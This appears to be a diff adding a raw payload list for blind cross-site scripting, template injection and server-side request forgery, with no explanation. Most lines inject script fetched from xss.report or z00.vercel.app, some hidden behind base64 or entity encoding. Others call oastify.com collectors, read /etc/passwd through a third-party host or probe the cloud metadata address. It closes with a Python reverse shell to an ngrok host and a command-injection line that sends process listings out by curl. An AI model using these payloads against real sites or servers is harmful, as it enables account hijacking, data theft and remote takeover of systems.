@@ -1,0 +1,230 @@
+-->'">"></script><sCript/srC=//xss.report/c/someusername>
+
+-->'"/>%0a"><base href=//xss.report/c/someusername><script src='./'></script>
+
+*/ /**/</style></script><script src="https://xss.report/c/someusername"></script>
+
+var script = document.createElement('script');
+script.type = 'text/javascript';
+script.src = 'https://xss.report/c/someusername';
+document.head.appendChild(script);
+
+&#60;img src=x onerror=alert()&#62;
+
+<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">ПРОМОКОД 70%</a>
+
+&#60;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8vejAwLnZlcmNlbC5hcHAiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))&#62;
+
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/someusername\';document.body.appendChild(a)')
+"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vejAwLnZlcmNlbC5hcHAiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
+
+*//**/\"'>--></style></title></textarea></script><script/src=//xss.report/c/someusername></script><iframe/src=http://vwvjvdns3o7pmvw6u8zaer7d248vwrkg.oastify.com></iframe><img/src=https://vwvjvdns3o7pmvw6u8zaer7d248vwrkg.oastify.com></img>
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vejAwLnZlcmNlbC5hcHAiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>{7*7}${{7*7}}
+
+*//**/\"'>--></style></title></textarea></script><script/src=\"//xss.report/c/someusername\"></script>
+
+*//**/"\'>--></style></title></textarea></script><script/src=//xss.report/c/someusername></script>
+
+*//**/>-->'"/>%0d%0a%09%0b"></style></title></textarea></script><script/src=//xss.report/c/someusername></script>
+
+&#60;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vejAwLnZlcmNlbC5hcHAiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))&#62;
+
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8vejAwLnZlcmNlbC5hcHAiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+
+"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.report/c/someusername&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
+<script>$.getScript("//xss.report/c/someusername")</script>
+
+*//**/"'>--></style></title></textarea></script><iframe height="3000" width="800" src=https://bb-n3s.ru/hrtek.php?url=%2fetc%2fpasswd></iframe><img src=https://bb-n3s.ru/hrtek.php?url=%2fetc%2fpasswd></img>aaa<iframe src="https://bb-n3s.ru/hrtek.php?url=%2fetc%2fpasswd"></script>javascript:eval('var a=document.createElement(\'script\');a.src=\'https://6hougo83ozs076hhfjklz2sonft6h15q.oastify.com\';document.body.appendChild(a)')<script/src=//xss.report/c/someusername></script><iframe/src=http://namebody.r3vf29uoakeltr321466lne990fr3ir7.oastify.com></iframe><iframe/src=//169.254.169.254/></iframe><img/src=https://nameimg.img.r3vf29uoakeltr321466lne990fr3ir7.oastify.com></img><x="{9*9}\r\n%0A%09%0D<svg\onload=alert(document.cookies)>
+
+
+*//**/"'>--></style></title></textarea></script><script/src="//xss.report/c/someusername"></script><iframe/src=http://r3vf29uoakeltr321466lne990fr3ir7.oastify.com></iframe><img/src=https://r3vf29uoakeltr321466lne990fr3ir7.oastify.com></img>
+
+
+*//**/\"'>--></style></title></textarea></script><script/src=//xss.report/c/someusername></script><iframe/src=http://vwvjvdns3o7pmvw6u8zaer7d248vwrkg.oastify.com></iframe><img/src=https://vwvjvdns3o7pmvw6u8zaer7d248vwrkg.oastify.com></img>
+
+
+*//**/"'>--></style></title></textarea></script><script/src=//xss.report/c/someusername></script><iframe/src=//xss.report/c/someusername></iframe><img/src=https://xss.report/c/someusername></img><x="{9*9}\r\n%0A%09%0D<svg\onload=alert(1)> 
+
+*//**/"'>--></style></title></textarea></script><script/src=//xss.report/c/someusername></script><iframe/src=//xss.report/c/someusername></iframe><img/src="x"  onerror="alert('hello')"></img><x="{9*9}\r\n%0A%09%0D<svg\onload=alert(1)> 
+<img src="x" onerror="alert('hello')" />
+
+
+
+*//**/'">--></title/</script/</style/--><iframe/onload='alert``'
+
+*//**/"'>--></style></title></textarea></script><script/src=//xss.report/c/someusername></script><iframe/src=//xss.report/c/someusername></iframe><img/src onerror=\u0061\u006C\u0065\u0072\u0074(1)/></img><x="{9*9}\r\n%0A%09%0D<svg\onload=alert(1)> 
+<img/src onerror=\u0061\u006C\u0065\u0072\u0074(1)/>
+
+\-->'></style></div></article></script><script/src=//xss.report/c/someusername>
+
+*//**/"'>--></style></title></textarea></script><script/src=//xss.report/c/someusername></script><iframe/src=//xss.report/c/someusername></iframe><img/src="x"  onerror="alert('hello')"><img/src onerror=\u0061\u006C\u0065\u0072\u0074(1)/></img><img src="x" onerror="alert('hello')" /><x="{9*9}\r\n%0A%09%0D<svg\onload=alert(1)> 
+
+\u003cscript\u003ealert(document.cookie)\u003c/script\u003e\n\u003cscript\u003ealert(document.cookie)\u003c/script\u003e
+
+
+
+*//**/"'>--></style></title></textarea></script><script/src=//xss.report/c/someusername></script><iframe/src=//xss.report/c/someusername></iframe><img/src onerror=\u0061\u006C\u0065\u0072\u0074(1)/></img><x="{9*9}\r\n%0A%09%0D<svg\onload=alert(1)> 
+<img src="x" onerror="alert('hello')" />
+
+
+2*//**/"'>--></style></title></textarea><svg><x><script>alert('1'&#41</x><SCRscriptIPT>alert(1)</SCRscriptIPT><<script>alert("XSS");//<img/src onerror=\u0061\u006C\u0065\u0072\u0074(1)/></img>
+
+
+*//**/"'>--></style></title></textarea><svg><x><script><</script><<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //" autofocus onfocus=alert(document.domain) x="
+
+
+vercel deploy --prod -d
+
+t@(<script src=//xss.report/c/someusername>)gmail.com
+"a@b.c><script/src='//xss.report/c/someusername>'></script>"@d.e
+
+
+"><sCript sRc=//xss.report/c/someusername></sCript>"@gmail.com \"><sCript sRc=//xss.report/c/someusername></sCript>\"@gmail.com
+"><sCript sRc=//xss.report/c/someusername></sCript>"@gmail.com \"><sCript sRc=//xss.report/c/someusername></sCript>\"@gmail.com
+
+"><sCript/srC=//xss.report/c/someusername>
+<script src=//xss.report/c/someusername>
+
+"><sCript/srC=//xss.report/c/someusername>{{7*7}}${7*7}</sCript><"
+"><sCript/srC=//xss.report/c/someusername>{{7*7}}${7*7}</sCript><"xss.report/c/someusername
+
+"><sCript sRc=//xss.report/c/someusername></sCript><"
+
+\"><sCript sRc=//xss.report/c/someusername></sCript><\"
+
+
+"><script src=//xss.report/c/someusername>$.getScript("https://xss.report/c/someusername")</script><"
+
+\"><script src=//xss.report/c/someusername>$.getScript(\"https://xss.report/c/someusername\")</script>
+
+"><script src=https://xss.report/c/someusername>$.getScript("https://xss.report/c/someusername")</script><"
+
+("><script src=//xss.report/c/someusername>$.getScript("https://xss.report/c/someusername")</script>)@gmail.com
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onMouseOver=$.getScript('https://xss.report/c/someusername'))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=$.getScript('https://xss.report/c/someusername')//>\x3e
+"$.getScript('https://xss.report/c/someusername')//'
+
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/someusername\';document.body.appendChild(a)')
+
+"><script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/someusername");a.send();</script><"
+
+"'--></style></title></textarea></script><script src=https://xss.report/c/someusername>"@test.com
+test@("'--></style></title></textarea></script><script src=https://xss.report/c/someusername>)test.com
+
+t@(<script src=https://xss.report/c/someusername>)gmail.com
+
+("'--></style></title></textarea></script><sCript src=https://xss.report/c/someusername></sCript>)@test.com
+
+(\"'--></style></title></textarea></script><sCript src=https://xss.report/c/someusername></sCript>)@test.com
+
+
+'"><script src=https://xss.report/c/someusername></script>
+
+-->'"/>%0a"><base href=//z00.vercel.app><script src='./'></script>
+
+*/ /**/</style><script src="https://z00.vercel.app"></script>
+
+var script = document.createElement('script');
+script.type = 'text/javascript';
+script.src = 'https://z00.vercel.app';
+document.head.appendChild(script);
+
+
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://z00.vercel.app\';document.body.appendChild(a)')
+"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vejAwLnZlcmNlbC5hcHAiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
+
+*//**/\"'>--></style></title></textarea></script><script/src=//z00.vercel.app></script><iframe/src=http://vwvjvdns3o7pmvw6u8zaer7d248vwrkg.oastify.com></iframe><img/src=https://vwvjvdns3o7pmvw6u8zaer7d248vwrkg.oastify.com></img>
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vejAwLnZlcmNlbC5hcHAiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>{7*7}${{7*7}}
+
+*//**/\"'>--></style></title></textarea></script><script/src=\"//z00.vercel.app\"></script>
+
+*//**/"\'>--></style></title></textarea></script><script/src=//z00.vercel.app></script>
+
+*//**/>-->'"/>%0d%0a%09%0b"></style></title></textarea></script><script/src=//z00.vercel.app></script>
+
+&#60;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vejAwLnZlcmNlbC5hcHAiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))&#62;
+
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8vejAwLnZlcmNlbC5hcHAiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+
+"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;z00.vercel.app&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
+<script>$.getScript("//z00.vercel.app")</script>
+
+*//**/"'>--></style></title></textarea></script><iframe height="3000" width="800" src=https://bb-n3s.ru/hrtek.php?url=%2fetc%2fpasswd></iframe><img src=https://bb-n3s.ru/hrtek.php?url=%2fetc%2fpasswd></img>aaa<iframe src="https://bb-n3s.ru/hrtek.php?url=%2fetc%2fpasswd"></script>javascript:eval('var a=document.createElement(\'script\');a.src=\'https://6hougo83ozs076hhfjklz2sonft6h15q.oastify.com\';document.body.appendChild(a)')<script/src=//z00.vercel.app></script><iframe/src=http://namebody.r3vf29uoakeltr321466lne990fr3ir7.oastify.com></iframe><iframe/src=//169.254.169.254/></iframe><img/src=https://nameimg.img.r3vf29uoakeltr321466lne990fr3ir7.oastify.com></img><x="{9*9}\r\n%0A%09%0D<svg\onload=alert(document.cookies)>
+
+
+*//**/"'>--></style></title></textarea></script><script/src="//z00.vercel.app"></script><iframe/src=http://r3vf29uoakeltr321466lne990fr3ir7.oastify.com></iframe><img/src=https://r3vf29uoakeltr321466lne990fr3ir7.oastify.com></img>
+
+
+*//**/\"'>--></style></title></textarea></script><script/src=//z00.vercel.app></script><iframe/src=http://vwvjvdns3o7pmvw6u8zaer7d248vwrkg.oastify.com></iframe><img/src=https://vwvjvdns3o7pmvw6u8zaer7d248vwrkg.oastify.com></img>
+
+
+*//**/"'>--></style></title></textarea></script><script/src=//z00.vercel.app></script><iframe/src=//z00.vercel.app></iframe><img/src=https://z00.vercel.app></img><x="{9*9}\r\n%0A%09%0D<svg\onload=alert(1)> 
+
+*//**/"'>--></style></title></textarea></script><script/src=//z00.vercel.app></script><iframe/src=//z00.vercel.app></iframe><img/src="x"  onerror="alert('hello')"></img><x="{9*9}\r\n%0A%09%0D<svg\onload=alert(1)> 
+<img src="x" onerror="alert('hello')" />
+
+
+*//**/"'>--></style></title></textarea></script><script/src=//z00.vercel.app></script><iframe/src=//z00.vercel.app></iframe><img/src onerror=\u0061\u006C\u0065\u0072\u0074(1)/></img><x="{9*9}\r\n%0A%09%0D<svg\onload=alert(1)> 
+<img/src onerror=\u0061\u006C\u0065\u0072\u0074(1)/>
+
+\-->'></style></div></article></script><script/src=//z00.vercel.app>
+
+*//**/"'>--></style></title></textarea></script><script/src=//z00.vercel.app></script><iframe/src=//z00.vercel.app></iframe><img/src="x"  onerror="alert('hello')"><img/src onerror=\u0061\u006C\u0065\u0072\u0074(1)/></img><img src="x" onerror="alert('hello')" /><x="{9*9}\r\n%0A%09%0D<svg\onload=alert(1)> 
+
+
+*//**/"'>--></style></title></textarea></script><script/src=//z00.vercel.app></script><iframe/src=//z00.vercel.app></iframe><img/src onerror=\u0061\u006C\u0065\u0072\u0074(1)/></img><x="{9*9}\r\n%0A%09%0D<svg\onload=alert(1)> 
+<img src="x" onerror="alert('hello')" />
+
+
+2*//**/"'>--></style></title></textarea><svg><x><script>alert('1'&#41</x><SCRscriptIPT>alert(1)</SCRscriptIPT><<script>alert("XSS");//<img/src onerror=\u0061\u006C\u0065\u0072\u0074(1)/></img>
+
+
+*//**/"'>--></style></title></textarea><svg><x><script><</script><<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //" autofocus onfocus=alert(document.domain) x="
+
+
+vercel deploy --prod -d
+
+t@(<script src=//z00.vercel.app>)gmail.com
+"a@b.c><script/src='//z00.vercel.app>'></script>"@d.e
+
+
+"><sCript sRc=//z00.vercel.app></sCript>"@gmail.com \"><sCript sRc=//z00.vercel.app></sCript>\"@gmail.com
+"><sCript sRc=//z00.vercel.app></sCript>"@gmail.com \"><sCript sRc=//z00.vercel.app></sCript>\"@gmail.com
+
+"><sCript/srC=//z00.vercel.app>
+<script src=//z00.vercel.app>
+
+"><sCript/srC=//z00.vercel.app>{{7*7}}${7*7}</sCript><"
+"><sCript/srC=//z00.vercel.app>{{7*7}}${7*7}</sCript><"z00.vercel.app
+
+"><sCript sRc=//z00.vercel.app></sCript><"
+
+\"><sCript sRc=//z00.vercel.app></sCript><\"
+
+
+"><script src=//z00.vercel.app>$.getScript("https://z00.vercel.app")</script><"
+
+\"><script src=//z00.vercel.app>$.getScript(\"https://z00.vercel.app\")</script>
+
+"><script src=https://z00.vercel.app>$.getScript("https://z00.vercel.app")</script><"
+
+("><script src=//z00.vercel.app>$.getScript("https://z00.vercel.app")</script>)@gmail.com
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onMouseOver=$.getScript('https://z00.vercel.app'))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=$.getScript('https://z00.vercel.app')//>\x3e
+"$.getScript('https://z00.vercel.app')//'
+
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://z00.vercel.app\';document.body.appendChild(a)')
+
+"><script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//z00.vercel.app");a.send();</script><"
+
+"'--></style></title></textarea></script><script src=https://z00.vercel.app>"@test.com
+test@("'--></style></title></textarea></script><script src=https://z00.vercel.app>)test.com
+
+t@(<script src=https://z00.vercel.app>)gmail.com
+
+("'--></style></title></textarea></script><sCript src=https://z00.vercel.app></sCript>)@test.com
+
+(\"'--></style></title></textarea></script><sCript src=https://z00.vercel.app></sCript>)@test.com
+
+1; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.eu.ngrok.io",15736));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' #
+|ps${IFS}aux|curl${IFS}http://<your-server>${IFS}-d${IFS}@-
